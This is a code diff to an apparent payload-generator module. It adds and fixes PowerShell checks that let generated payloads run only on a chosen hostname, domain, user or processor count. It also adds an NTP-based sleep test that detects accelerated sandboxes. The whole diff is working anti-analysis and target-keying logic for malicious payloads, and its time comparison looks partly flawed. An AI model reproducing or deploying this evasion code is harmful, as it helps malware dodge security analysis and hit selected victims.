@@ -40,26 +40,37 @@ class PayloadModule:
             "HOSTNAME"       : ["X", "Optional: Required system hostname"],
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
-            "USERNAME"       : ["X", "Optional: The required user account"]}
+            "USERNAME"       : ["X", "Optional: The required user account"],
+            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]}
 
     def system_checks(self):
         check_code = ''
         num_ends_required = 0
 
         if self.required_options["HOSTNAME"][0].lower() != "x":
-            check_code += "if($env:computername -eq \"" + self.required_options["HOSTNAME"][0].lower() + "\"{\n"
+            check_code += "if($env:computername -eq \"" + self.required_options["HOSTNAME"][0].lower() + "\") {\n"
             num_ends_required += 1
 
         if self.required_options["DOMAIN"][0].lower() != "x":
-            check_code += "if((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq \"" + self.required_options["DOMAIN"][0].lower() + "\"{\n"
+            check_code += "if((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq \"" + self.required_options["DOMAIN"][0].lower() + "\") {\n"
             num_ends_required += 1
 
         if self.required_options["USERNAME"][0].lower() != "x":
-            check_code += "if($env:username -eq \"" + self.required_options["USERNAME"][0].lower() + "\"{\n"
+            check_code += "if($env:username -eq \"" + self.required_options["USERNAME"][0].lower() + "\") {\n"
             num_ends_required += 1
 
         if self.required_options["PROCESSORS"][0].lower() != "x":
-            check_code += "if((Get-WMIObject -Class Win32_Processor).NumberOfLogicalProcessors -ge " + self.required_options["PROCESSORS"][0].lower() + "{\n"
+            check_code += "if((Get-WMIObject -Class Win32_Processor).NumberOfLogicalProcessors -ge " + self.required_options["PROCESSORS"][0].lower() + ") {\n"
+            num_ends_required += 1
+
+        if self.required_options["SLEEP"][0].lower() != "x":
+            check_code += "[Byte[]]$NTPTransmit=,1*48;$NTPTransmit[0]=0x1B;[Byte[]]$secondTransmit=,1*48;$secondTransmit[0]=0x1B;$noAccess=$false;"
+            check_code += "Try{$Socket=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$Socket.Connect('us.pool.ntp.org',123);[Void]$Socket.Send($NTPTransmit);[Void]$Socket.Receive($NTPTransmit)}catch{$noAccess=$true};"
+            check_code += "$runTotal=0;ForEach($Index in $NTPTransmit[40..43]){$runTotal=$runTotal*256+$Index};$firstTime=(New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second;"
+            check_code += "Start-Sleep -s " + self.required_options["SLEEP"][0] + ";"
+            check_code += "Try{$NewSock=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$NewSock.Connect('us.pool.ntp.org',123);[Void]$NewSock.Send($secondTransmit);[Void]$NewSock.Receive($secondTransmit);$NewSock.Close()}catch{$noAccess=$true};"
+            check_code += "$runTotal=0;ForEach($Index in $secondTransmit[40..43]){$runTotal=$runTotal*256+$Index}\n"
+            check_code += "if ((New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second - $firstTime -ge " + self.required_options["SLEEP"][0] + " -or $noAccess) {\n"
             num_ends_required += 1
 
         return check_code, num_ends_required
